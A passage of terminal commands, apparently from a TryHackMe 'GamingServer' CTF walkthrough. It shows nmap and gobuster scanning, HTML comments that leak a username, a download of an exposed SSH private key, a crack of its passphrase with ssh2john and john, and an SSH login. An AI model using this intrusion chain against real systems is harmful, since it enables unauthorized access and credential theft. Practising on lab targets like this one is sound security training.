...
```
bibo318@parrot:~/CTFs/tryhackme/GamingServer$ sudo nmap -A -Pn -sS -sC -sV -O 10.10.71.89
...
```
bibo318@parrot:~/CTFs/tryhackme/GamingServer$ curl -s http://10.10.71.89 | grep "<\!--"
<!-- Website template by freewebsitetemplates.com -->
<!-- john, please add some actual content to the site! lorem ipsum is horrible to look at. -->
```

```
bibo318@parrot:~/CTFs/tryhackme/GamingServer$ gobuster dir -u 10.10.71.89 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.0.1
...
```
bibo318@parrot:~/CTFs/tryhackme/GamingServer$ gobuster dir -u 10.10.71.89 -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
...
```
bibo318@parrot:~/CTFs/tryhackme/GamingServer$ wget http://10.10.71.89/secret/secretKey
...
bibo318@parrot:~/CTFs/tryhackme/GamingServer$ chmod 400 secretKey
bibo318@parrot:~/CTFs/tryhackme/GamingServer$ ssh -i secretKey john@^C
bibo318@parrot:~/CTFs/tryhackme/GamingServer$ /usr/share/john/ssh2john.py secretKey > ssh.hash
bibo318@parrot:~/CTFs/tryhackme/GamingServer$ john ssh.hash  --wordlist=dict.lst
...
```
bibo318@parrot:~/CTFs/tryhackme/GamingServer$ ssh -i secretKey john@10.10.71.89
